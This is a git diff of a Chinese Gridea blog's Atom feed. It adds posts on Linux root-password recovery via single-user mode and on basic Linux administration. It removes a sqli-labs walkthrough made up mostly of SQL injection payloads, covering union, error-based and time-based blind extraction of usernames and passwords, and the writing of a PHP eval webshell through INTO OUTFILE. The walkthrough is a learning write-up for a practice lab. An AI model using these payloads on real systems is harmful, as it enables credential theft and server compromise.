@@ -2,14 +2,221 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://kite-007.github.io</id>
     <title>Gridea</title>
-    <updated>2020-10-26T03:06:34.768Z</updated>
+    <updated>2021-03-07T10:38:20.565Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://kite-007.github.io"/>
     <link rel="self" href="https://kite-007.github.io/atom.xml"/>
     <subtitle>温故而知新</subtitle>
     <logo>https://kite-007.github.io/images/avatar.png</logo>
     <icon>https://kite-007.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2020, Gridea</rights>
+    <rights>All rights reserved 2021, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[Linux找回root密码]]></title>
+        <id>https://kite-007.github.io/post/linux-zhao-hui-root-mi-ma/</id>
+        <link href="https://kite-007.github.io/post/linux-zhao-hui-root-mi-ma/">
+        </link>
+        <updated>2021-03-07T09:56:40.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>使用单用户模式进行修改root的密码</strong></p>
+<ol>
+<li>
+<p>再启动虚拟机时，进入开机界面后按下“e”，进入编辑页面。<br>
+<img src="https://kite-007.github.io/post-images/1615111403186.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>按向下方向键找到如图所示一行，在这一行之后添加init=/bin/sh之后按下Ctrl+X，进入单用户模式。<br>
+<img src="https://kite-007.github.io/post-images/1615112842008.png" alt="" loading="lazy"><br>
+<img src="https://kite-007.github.io/post-images/1615112869941.png" alt="" loading="lazy"></p>
+</li>
+</ol>
+<p>3.之后输入mount -o remount,rw /按下Enter，在输入passwd，之后修改密码，成功之后键入touch /.autorelabel按下Enter，再键入exec /sbin/init按下Enter等待修改成功，如图（这里密码输入了两遍）。<br>
+<img src="https://kite-007.github.io/post-images/1615113030396.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# Linux手记（基础篇）]]></title>
+        <id>https://kite-007.github.io/post/linux-shou-ji-ji-chu-pian/</id>
+        <link href="https://kite-007.github.io/post/linux-shou-ji-ji-chu-pian/">
+        </link>
+        <updated>2021-03-06T11:41:44.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">1.  Linux目录结构</a></li>
+<li><a href="#2-linux%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93">2. Linux远程登陆与远程文件传输</a></li>
+<li><a href="#3-vi%E4%B8%8Evim%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8">3. vi与vim的介绍与使用</a></li>
+<li><a href="#4-%E5%85%B3%E6%9C%BA%E9%87%8D%E5%90%AF%E5%91%BD%E4%BB%A4">4. 关机重启命令</a></li>
+<li><a href="#5-%E7%94%A8%E6%88%B7">5. 用户</a></li>
+<li><a href="#6-%E7%94%A8%E6%88%B7%E7%BB%84">6. 用户组</a></li>
+<li><a href="#7-%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB">7. 指定运行级别</a></li>
+</ul>
+(Linux手记)</p>
+<h1 id="1-linux目录结构">1.  Linux目录结构</h1>
+<blockquote>
+<p>在Linux的世界里，一切都是文件</p>
+</blockquote>
+<pre><code>/（根）目录\*：根。
+/boot（引导）目录\*：Linux启动的核心文件。
+/swap（缓存）目录\*：与内存大小相同。
+/bin目录：为Binary的缩写，存放着经常使用的命令和指令。
+/sbin目录：s意为Super User的意思，这里存放着系统管理员所使用的系统管理程序。
+/home目录\*：普通用户主目录。
+/root目录\*：系统管理员主目录。
+/lib目录：系统程序运行时需要用到这里的动态链接库，几乎所有的程序都要使用~win下的DLL文件。
+/lost+found（隐藏）目录：一般为空，当非法关机后，这里会存在文件。
+/etc目录\*：存放系统管理所需要的配置文件和目录，像安装了MySQL之后他的配置文件就在这里。
+/usr目录\*：很重要的一个目录，大部分应用程序和文件都在这里~win的program files目录。
+/proc（系统）目录：一个虚拟目录，存放系统内存映射，可以访问来获取系统信息。
+/src（系统）目录：为service的缩写，存放服务启动之后需要提取的数据。
+/sys（系统）目录：该目录安装了Linux2.6内核中新出现的一个文件系统 sysfs=》。
+/tmp目录：存放临时文件。
+/dev目录：把硬件设备用文件的形式存储，~win的设备管理器。
+/media目录\*：Linux识别的一些设备，如U盘，光驱会被挂载到这里。
+/mnt目录：外部临时挂载目录。
+/opt目录：给主机额外安装软件所存放的目录（把要安装的软件放在这里进行解压安装）。
+/usr/local目录\*：给主机额外安装软件所安装的目录，一般是通过编译源码方式安装的程序。
+/var目录\*：存放着不断扩充更新或者经常修改的东西，像各种日志文件。
+/selinux目录：全拼security-enhanced linux，SELinux是一种安全子系统，当启用服务时，该文件可以被看到，他控制程序只能访问特定的文件，有三种工作模式，可以自行设置。
+</code></pre>
+<h1 id="2-linux远程登陆与远程文件传输">2. Linux远程登陆与远程文件传输</h1>
+<p><strong>一般工作时使用远程登陆与远程文件传输，需下载（Xshell与Xftp）.链接：https://www.netsarang.com/en/free-for-home-school/</strong></p>
+<ol>
+<li>Xshell远程登陆
+<ul>
+<li>使用Xshell来远程登陆到Linux，远程登陆使用ssh协议（22端口）。</li>
+<li>ifconfig来查看网络信息，获取IP，并在主机终端进行ping，查看与主机的网络是否ping通。</li>
+<li>在Xshell中新建，输入要链接的Linux网络IP，选择一次性，输入账户密码，连接成功。</li>
+</ul>
+</li>
+<li>Xftp远程文件传输
+<ul>
+<li>与Xshell步骤一致</li>
+<li>左为Windows操作系统，右为Linux操作系统，可以鼠标右键进行相互传输</li>
+<li>处理Xftp中文乱码：菜单栏属性选项卡，选择选项，修改编码。</li>
+</ul>
+</li>
+</ol>
+<h1 id="3-vi与vim的介绍与使用">3. vi与vim的介绍与使用</h1>
+<p><strong>Linux系统会内置vi文本编辑器，而vim则可以视为vi的加强版本，具有程序编程（代码补全，编译和错误跳转等）的能力，可以用字体颜色辨别代码语法的正确性。</strong></p>
+<ol>
+<li>vi与vim介绍
+<ul>
+<li>vi与vim有三种模式：正常模式，插入模式和命令行模式
+<ul>
+<li>正常模式（默认）:wq保存退出。</li>
+<li>插入模式，按下i, o, a, r等字母进入，按下Esc建会退出该模式进入到正常模式。</li>
+<li>命令行模式（低端），正常模式按下Shift与‘：’号进入，:w表示写入，:q表示保存，这之后加‘！’号表示强制的意思，与权限有关。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>vi与vim快捷键（常用）
+<ul>
+<li>yy：拷贝光标当前行，nyy则是拷贝当前光标所在的n行。</li>
+<li>dd：删除光标当前行，ndd则是删除当前光标所在的n行。</li>
+<li>查找关键字：在命令行的模式下输入（/关键字）回车进行查找，按键n表示下一个。</li>
+<li>设置文件行号：在命令行模式下输入set nu，取消文件行号则是set nonu。</li>
+<li>移动光标：G为移动到最后一行，gg为移动到第一行，ngg则为移动到第n行。</li>
+<li>撤销一次动作（从正常模式来到插入模式后返回到正常模式）：u按键</li>
+</ul>
+</li>
+</ol>
+<h1 id="4-关机重启命令">4. 关机重启命令</h1>
+<ul>
+<li>基本介绍：
+<ul>
+<li>shutdown -h now ;         立刻进行关机</li>
+<li>shutdown -h 1 ;               1分钟之后关机，会给客户机发送提示信息</li>
+<li>shutdown -r now ;         立刻进行重启</li>
+<li>halt ;                                关机</li>
+<li>reboot ;                            重启</li>
+<li>sync ;                               把内存的数据同步到磁盘</li>
+</ul>
+</li>
+<li>细节：
+<ul>
+<li>无论是重启或是关闭系统，首先都要运行sync命令，将内存中的数据写入到磁盘。</li>
+<li>目前在运行shutdown/halt/reboot等命令均以在关机前进行了sync。</li>
+</ul>
+</li>
+</ul>
+<h1 id="5-用户">5. 用户</h1>
+<ol>
+<li>切换用户：
+<ul>
+<li>登录之后使用：su - 用户名，来更换用户，在多级用户下使用logout进行注销当前用户，1级无效。</li>
+</ul>
+</li>
+<li>添加用户：
+<ul>
+<li>root权限下使用useradd 用户名，来添加用户，默认该用户目录在/home目录下。</li>
+<li>也可以使用useradd -d 指定目录 用户名，来给创建的用户指定目录。</li>
+<li>pwd，显示当前用户所在的目录</li>
+</ul>
+</li>
+<li>设置密码：
+<ul>
+<li>passwd 用户名，来给用户设置密码，如果不加用户，则是给当前用户设置。</li>
+</ul>
+</li>
+<li>删除用户：
+<ul>
+<li>userdel 用户名，保存该用户的家目录（该用户名的目录不是home）。</li>
+<li>userdel -r 用户名，不保存该用户的家目录。</li>
+</ul>
+</li>
+<li>查询用户：
+<ul>
+<li>id 用户名，查询该用户所在的组。</li>
+<li>whoami/who am i，查询当前所登录的用户。</li>
+</ul>
+</li>
+</ol>
+<h1 id="6-用户组">6. 用户组</h1>
+<p><strong>划分组可以使系统对多个用户进行统一的管理</strong></p>
+<ol>
+<li>新增组：
+<ul>
+<li>groupadd 组名，</li>
+</ul>
+</li>
+<li>删除组：
+<ul>
+<li>groupdel 组名，</li>
+</ul>
+</li>
+<li>增加用户时直接加上组：
+<ul>
+<li>useradd -g 用户组 用户名，如果创建用户不加组，系统会默认生成一个与用户名相同的组，并将该用户放在此组里面。</li>
+</ul>
+</li>
+<li>修改用户的组：
+<ul>
+<li>usermod -g 用户组 用户名，</li>
+</ul>
+</li>
+<li>用户和组相关的文件：
+<ul>
+<li>/etc/passwd：用户的配置文件，记录用户的各种信息。</li>
+<li>每行的含义：（用户名：口令：用户标识号（uid）：组标识号（gid）：注释性描述：主目录：登录Shell）</li>
+<li>/etc/shadow：口令的配置文件</li>
+<li>每行的含义：（登录名：加密口令：最后一次修改的时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志）</li>
+<li>/etc/group：组的配置文件，记录Linux下用户所包含的组信息</li>
+<li>每行的含义：（组名：口令：组标识号：组内用户列表）</li>
+</ul>
+</li>
+</ol>
+<h1 id="7-指定运行级别">7. 指定运行级别</h1>
+<p><strong>CentOS7在/etc/inittab文件中有修改默认级别说明</strong></p>
+<p>运行级别说明<br>
+* 0：关机<br>
+* 1：单用户【找回丢失密码】<br>
+* 2：多用户状态没有网络服务<br>
+* 3：多用户状态有网络服务<br>
+* 4：系统未使用保留给用户<br>
+* 5：图形界面<br>
+* 6：系统重启<br>
+* 常用的运行级别为3和5，也可以指定默认运行级别<br>
+* init X , X:0.1.2.3.4.5.6,切换不同的运行级别</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[WEB新手区]]></title>
         <id>https://kite-007.github.io/post/web-xin-shou-qu/</id>
@@ -173,329 +380,6 @@ service apache2 start 	      #启动apache2服务<br>
 <img src="https://kite-007.github.io/post-images/1602507875585.png" alt="" loading="lazy"><br>
 <img src="https://kite-007.github.io/post-images/1602507814348.png" alt="" loading="lazy"></p>
 <p>👁第五：后续问题解决：https://www.jianshu.com/p/05135f8de848（参考）</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sqli-Less]]></title>
-        <id>https://kite-007.github.io/post/sql-injections/</id>
-        <link href="https://kite-007.github.io/post/sql-injections/">
-        </link>
-        <updated>2020-10-05T02:59:11.000Z</updated>
-        <content type="html"><![CDATA[<p>为了方便学习在$sql语句下加入：<br>
-echo $sql;<br>
-echo &quot;<br>&quot;;</p>
-<p>less-1<br>
-“”<br>
-payload：<br>
-?id=1' --+//报错，--+为注释掉原后面的“'”；<br>
-?id=1' order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
-?id=-1' union select 1,2,3 --+//查看字段回显位置，这里为2，3<br>
-?id=-1' union select 1,2,group_concat(schema_name)from information_schema.schemata--+联合查询取出数据<br>
-?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+取出所有表信息<br>
-?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+取出所有列信息<br>
-?id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+取出账户信息</p>
-<p>schema：数据库中schema是数据库对象集合<br>
-information_schema 信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息<br>
-order by X  //给第X列数据进行排序<br>
-group_concat()    //将数据用一行显示出来<br>
-concat_ws('C',A,B)  //用”C“将“A”与“B”隔开,C不为NULL<br>
-查库：select schema_name from information_schema.schemata<br>
-查表：select table_name from information_schema.tables where table_schema='security'<br>
-查列：select column_name from information_schema.columns where table_name='users'<br>
-查字段：select username,password from security.users</p>
-<p>less-2</p>
-<p>payload：<br>
-?id=1' //查看判断报错，此处多了一个’，为数字型注入<br>
-?id=1 order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
-?id=-1 union select 1,2,3 --+//查看字段回显位置，这里为2，3<br>
-?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+联合查询取出数据<br>
-?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+取出所有表信息<br>
-?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+取出所有列信息<br>
-?id=-1 union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+取出账户信息</p>
-<p>less-3</p>
-<p>payload：<br>
-?id=1' //查看判断报错，此处1被('')包裹，所以在1后加')进行报错注入<br>
-?id=1') //进行报错注入<br>
-剩余同less-1</p>
-<p>less-4</p>
-<p>payload：<br>
-?id=1' //查看判断报错，此处1被(&quot;&quot;)包裹，所以在1后加&quot;)进行报错注入<br>
-?id=1&quot;) //进行报错注入<br>
-剩余同less-1</p>
-<p>less-5</p>
-<p>payload:<br>
-?id=1、?id=1'、?id=1&quot;、?id=1 --+、?id=1' --+、?id=1&quot; --+//进行报错判断1由'包裹<br>
-?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23//爆库<br>
-?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23//爆表<br>
-?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23//爆列<br>
-?id=1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23//爆字段(用户名)//updatexml()这个函数最多只能爆32位字符,要爆的数据超过了这个位数,所使用limit 0,1来实现单个数据查询。<br>
-?id=1' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)%23//爆字段(密码)//limit X,1)其中（X=1，2，3，···，11）</p>
-<p>concat()将多个字符串连接成一个字符串,返回结果为连接参数产生的字符串,如果有任何一个参数为null,则返回值为null。<br>
-updatexml()函数：UPDATEXML (XML_document, XPath_string, new_value);<br>
-第一个参数：XML_document是String格式，为XML文档对象的名称，<br>
-第二个参数：XPath_string (Xpath格式的字符串) ，<br>
-第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>
-作用：改变文档中符合条件的节点的值<br>
-改变XML_document中符合XPATH_string的值<br>
-而我们的注入语句为：	<br>
-updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>
-其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出	<br>
-ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'<br>
-xpath语法格式总结：http://www.uoften.com/article/125607.htm</p>
-<p>less-6</p>
-<p>payload:<br>
-?id=1、?id=1'、?id=1&quot;、?id=1 --+、?id=1' --+、?id=1&quot; --+//进行报错判断1由&quot;包裹<br>
-?id=1&quot; //进行报错注入<br>
-剩余同less-5</p>
-<p>less-7</p>
-<p>payload：<br>
-?id=1、?id=1'、?id=1&quot;、?id=1')、?id=1'))、?id=1 --+、?id=1' --+、?id=1&quot; --+、?id=1')) --+//进行报错判断1由'))包裹,提示使用into outfile<br>
-?id=1')) order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
-?id=-1')) union select 1,2,'<?php @eval($_POST["pass"]);?>' into outfile'D:\phpStudy\PHPTutorial\WWW\sqli-labs-master\Less-7\test.php'--+<br>
-test.php//进入后使用蚁剑，URL地址：http://127.0.0.1/sqli-labs-master/Less-7/test.php，连接密码：pass</p>
-<p>1.show variables like '%secure%';查看 secure-file-priv 当前的值，如果显示为NULL，则需要打开C:Aphpstudy\PHPTutorial\MysQL\my.ini文件，在其中加上一句：secure_file_priv=&quot;/&quot;。<br>
-2.一句话木马：php版本：<?php@eval($_POST["crow"]);?>其中crow是密码<br>
-3.load_file() 读取本地文件 select load_file('C:\Wphpstudy\PHPTutoria www\lsgliLess-7\test.txt');<br>
-4. into outfile 写文件 用法： select 'mysal is very good' into outfile 'test1.txt'；//不加括号！！！<br>
-文件位置： C\phpstudy\PHPTutorial\MysQL\data<br>
-或者是select 'crow 666' into outfile 'C:\phpstudy\PHPTutoria\www\sqli\Less-7\test.txt'；<br>
-文件位置：C:\phpstudy\PHPTutoria\ww sqli\Less-7<br>
-注意事项：\</p>
-<p>less-8</p>
-<p>payload：<br>
-?id=1、?id=1'、?id=1' --+//进行报错判断1由'))包裹<br>
-?id=1' order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
-?id=1' and if(length(database())=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//逐数猜测数据库的长度<br>
-?id=1' and if(ascii(substr((select database()),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//利用二分法进行猜测查询数据库的第一个字母<br>
-?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//利用二分法进行猜测查询数据库中第五个数据库第二个字母，盲注爆库<br>
-?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆表<br>
-?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆列<br>
-?id=1' and if(ascii(substr((select username from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆字段（用户名）<br>
-?id=1' and if(ascii(substr((select password from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆字段（密码）</p>
-<p>1.if(condition,A,B)，如果condition为真，则执行A，否则执行B<br>
-2.sleep(A)，如果执行该函数，则会睡眠A秒再返回结果<br>
-3.substr()函数：select substr(A,B,C)='s'；在A中从B位开始截取C位，与's'匹配，正确为1<br>
-4. ascii()函数：ascii('a')；返回a的ascii值</p>
-<p>less-9</p>
-<p>payload：<br>
-?id=1' order by X --+(X=1,2,3,···，99)//查询字段数，无法查询<br>
-?id=1' and sleep(10)--+//发现睡眠较长时间，存在注入漏洞<br>
-剩余同less-8</p>
-<p>less-10</p>
-<p>payload：<br>
-?id=1&quot; order by X --+(X=1,2,3,···，99)//查询字段数，无法查询<br>
-?id=1&quot; and sleep(10)--+//发现睡眠较长时间，存在注入漏洞<br>
-剩余同less-8</p>
-<p>less-11</p>
-<p>payload：<br>
-uname=admin&amp;passwd=admin&amp;submit=Submit//开启burp，用户名密码admin进行抓包<br>
-uname=admin' #&amp;passwd=admin&amp;submit=Submit//在post方式下--+注释行不通，用#进行注释<br>
-uname=admin' order by X #&amp;passwd=admin&amp;submit=Submit//（X=1，2，3）判断列数<br>
-uname=-admin' union select 1,2 #&amp;passwd=admin&amp;submit=Submit//破坏用户民联合查询回显位置<br>
-爆库uname=-admin' union select 1, group_concat(schema_name)from information_schema.schemata #&amp;passwd=admin&amp;submit=Submit<br>
-爆表uname=-admin' union select 1, group_concat(table_name)from information_schema.tables where table_schema='security' #&amp;passwd=admin&amp;submit=Submit<br>
-爆列uname=-admin' union select 1, group_concat(column_name)from information_schema.columns where table_name='users' #&amp;passwd=admin&amp;submit=Submit<br>
-爆字段uname=-admin' union select 1, group_concat(concat_ws('~',username,password))from security.users#&amp;passwd=admin&amp;submit=Submit</p>
-<p>less-12</p>
-<p>payload:<br>
-uname=admin&quot; #&amp;passwd=admin&amp;submit=Submit//判断包裹信息<br>
-剩余同less-11</p>
-<p>less-13</p>
-<p>POST单引号变形双注入</p>
-<p>admin admin,登录正确图片显示蓝色，错误显示红色，<br>
-admin' 有报错信息，同第五关利用报错回显信息<br>
-payload:<br>
-admin'//判断<br>
-uname=admin') order by 2#&amp;passwd=admin&amp;submit=Submit//判断<br>
-爆库uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
-爆表uname=admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
-爆列uname=admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
-爆字段uname=admin') and updatexml(1,concat(0x7e,(select (concat_ws('~',username,password)) from users limit 0,1),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit</p>
-<p>less-14</p>
-<p>payload:<br>
-uname=admin&quot; #&amp;passwd=admin&amp;submit=Submit//判断包裹信息<br>
-剩余同less-13</p>
-<p>less-15</p>
-<p>admin admin,登录正确图片显示蓝色，错误显示红色，<br>
-admin' 无报错信息，同第八关利用延时判断<br>
-payload:<br>
-uname=admin' &amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(length(database())=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(ascii(substr((select database()),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(ascii(substr((select schema_name from information_schema.schemata limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span 